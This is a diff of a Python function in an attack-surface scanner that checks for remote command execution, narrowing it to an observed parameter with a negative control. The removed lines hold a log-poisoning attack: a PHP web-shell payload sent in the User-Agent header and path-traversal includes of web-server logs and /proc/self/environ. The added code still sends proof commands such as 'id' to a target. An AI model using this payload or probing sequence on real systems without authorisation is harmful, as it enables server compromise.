@@ -25,16 +25,6 @@ _SIGNATURES = [
     ("whoami", re.compile(r"\b(nt authority\\|iis apppool\\|www-data|apache|nginx|root|daemon)\b", re.I)),
 ]
 
-# Parâmetros comuns de injeção de comando / LFI (probe bounded).
-_CMD_PARAMS = ["cmd", "exec", "command", "c", "run", "ping", "query", "x"]
-_LFI_PARAMS = ["file", "page", "include", "path", "doc", "template", "view"]
-_LOG_PATHS = [
-    "../../../../var/log/apache2/access.log",
-    "../../../../var/log/nginx/access.log",
-    "/proc/self/environ",
-]
-
-
 def _detect(text: str) -> tuple[str, str] | None:
     """Retorna (comando, trecho) se alguma assinatura de execução casar."""
     for cmd, pat in _SIGNATURES:
@@ -45,7 +35,13 @@ def _detect(text: str) -> tuple[str, str] | None:
     return None
 
 
-def verify_rce(target_url: str, proof_cmd: str = "id", os_hint: str = "linux") -> dict:
+def verify_rce(
+    target_url: str,
+    proof_cmd: str = "id",
+    os_hint: str = "linux",
+    *,
+    observed_parameter: str | None = None,
+) -> dict:
     """Tenta provar RCE no alvo com um comando de prova seguro. Bounded.
 
     Retorna: confirmed(bool), vector, command, evidence, attempts, note.
@@ -55,57 +51,49 @@ def verify_rce(target_url: str, proof_cmd: str = "id", os_hint: str = "linux") -
     result = {
         "target": target_url, "confirmed": False, "vector": None,
         "command": proof_cmd, "evidence": None, "attempts": 0,
-        "note": None, "safe_proof": True,
+        "note": None, "safe_proof": True, "negative_control_passed": False,
     }
     base = target_url if str(target_url).startswith("http") else f"https://{target_url}"
     base = base.rstrip("/")
 
-    try:
-        with httpx.Client(timeout=_TIMEOUT, follow_redirects=True, verify=False,
-                          headers={"User-Agent": "Mozilla/5.0 (easm-rce-proof)"}) as c:
-            # ── Vetor 1: parâmetro de comando direto (?cmd=id) ────────────────
-            for param in _CMD_PARAMS:
-                for cmd in (proof_cmd, win_cmd):
-                    if not is_safe_proof_command(cmd):
-                        continue
-                    url = f"{base}/?{param}={cmd}"
-                    result["attempts"] += 1
-                    try:
-                        r = c.get(url)
-                        hit = _detect(r.text)
-                        if hit:
-                            result.update({"confirmed": True, "vector": f"cmd-param:{param}",
-                                           "command": hit[0], "evidence": hit[1][:300]})
-                            return result
-                    except Exception:
-                        pass
+    if not observed_parameter or not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_.-]{0,63}", observed_parameter):
+        result["note"] = "RCE inconclusivo: nenhum parâmetro/sink observado foi fornecido; nenhuma rota foi adivinhada."
+        result["inconclusive"] = True
+        return result
 
-            # ── Vetor 2: LFI → log poisoning → RCE ────────────────────────────
-            # Passo A: envena o log com payload PHP que executa $_GET['c'].
-            poison = "<?php system($_GET['c']); ?>"
+    try:
+        with httpx.Client(timeout=_TIMEOUT, follow_redirects=False, verify=False,
+                          headers={"User-Agent": "Mozilla/5.0 (easm-rce-proof)"}) as c:
+            # Negative control prevents static page text from being mistaken
+            # for command output. Only the exact observed sink is exercised.
             try:
-                c.get(base + "/", headers={"User-Agent": poison})
+                control = c.get(base, params={observed_parameter: "easm-rce-negative-control"})
+                control_hit = _detect(control.text)
             except Exception:
-                pass
-            # Passo B: inclui o log via LFI com c=<comando de prova>.
-            for lp in _LFI_PARAMS:
-                for logp in _LOG_PATHS:
-                    for cmd in (proof_cmd,):
-                        url = f"{base}/?{lp}={logp}&c={cmd}"
-                        result["attempts"] += 1
-                        try:
-                            r = c.get(url)
-                            hit = _detect(r.text)
-                            if hit:
-                                result.update({"confirmed": True, "vector": f"lfi-log-poison:{lp}",
-                                               "command": hit[0], "evidence": hit[1][:300]})
-                                return result
-                        except Exception:
-                            pass
+                control_hit = None
+            for cmd in (proof_cmd, win_cmd):
+                if not is_safe_proof_command(cmd):
+                    continue
+                result["attempts"] += 1
+                try:
+                    response = c.get(base, params={observed_parameter: cmd})
+                    hit = _detect(response.text)
+                    if hit and not control_hit:
+                        result.update({
+                            "confirmed": True,
+                            "vector": f"observed-cmd-param:{observed_parameter}",
+                            "command": hit[0],
+                            "evidence": hit[1][:300],
+                            "negative_control_passed": True,
+                        })
+                        return result
+                except Exception:
+                    pass
     except Exception as exc:
         result["note"] = f"erro de conexão: {type(exc).__name__}"
         return result
 
-    result["note"] = ("Nenhum comando executou em %d tentativas — sem ponto de "
-                      "injeção alcançável. RCE NÃO comprovado (refutado)." % result["attempts"])
+    result["note"] = ("Nenhum comando foi comprovado em %d tentativas no sink observado; "
+                      "resultado inconclusivo, não refutado." % result["attempts"])
+    result["inconclusive"] = True
     return result
